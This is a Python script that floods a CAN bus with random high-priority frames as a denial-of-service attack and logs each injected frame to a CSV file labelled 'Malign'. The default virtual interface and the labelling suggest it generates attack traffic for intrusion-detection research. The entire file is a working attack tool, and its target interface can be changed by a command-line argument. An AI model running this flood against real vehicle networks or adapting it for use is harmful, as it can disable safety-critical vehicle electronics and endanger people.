import can
import time
import random
import argparse
import csv
from pathlib import Path

SLEEP_MIN = 0.05
SLEEP_MAX = 0.5
DOS_FACTOR = 5


def dos_attack(channel="vcan0", attack_duration=30, output_file="dos_log.csv"):
    print(f"Starting DoS attack on {channel} for {attack_duration} seconds...")
    print(f"Logging sent messages to {output_file}")

    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        with output_path.open("w", newline="") as f, can.interface.Bus(
            channel=channel, interface="socketcan"
        ) as bus:
            writer = csv.writer(f)
            writer.writerow(
                [
                    "Timestamp",
                    "ID (HEX)",
                    "Message Name",
                    "Data (HEX)",
                    "Decoded Signals",
                    "Legitimacy",
                ]
            )

            start_time = time.time()
            while (time.time() - start_time) < attack_duration:
                arbitration_id = random.randint(0x000, 0x010)
                data = [random.randint(0, 255) for _ in range(8)]
                msg = can.Message(arbitration_id=arbitration_id, data=data, is_extended_id=False)

                try:
                    bus.send(msg)
                    writer.writerow(
                        [
                            time.time(),
                            f"{msg.arbitration_id:03X}",
                            "DoS_Attack",
                            msg.data.hex().upper(),
                            "{}",
                            "Malign",
                        ]
                    )
                    time.sleep(random.uniform(SLEEP_MIN / DOS_FACTOR, SLEEP_MAX / DOS_FACTOR))
                except can.CanError as e:
                    print(f"Error sending message: {e}", end="\r")

            print("\nDoS attack finished.")

    except KeyboardInterrupt:
        print("\nDoS attack interrupted by user.")
    except can.CanError as e:
        print(f"Error with CAN interface: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Run a DoS attack on a CAN bus and log sent messages."
    )
    parser.add_argument("-c", "--channel", default="vcan0", help="CAN interface name")
    parser.add_argument(
        "-d", "--duration", type=int, default=60, help="Duration of the attack in seconds"
    )
    parser.add_argument(
        "-o", "--output", default="../csv/dos_attack_log.csv", help="Output CSV log file"
    )
    args = parser.parse_args()

    dos_attack(channel=args.channel, attack_duration=args.duration, output_file=args.output)
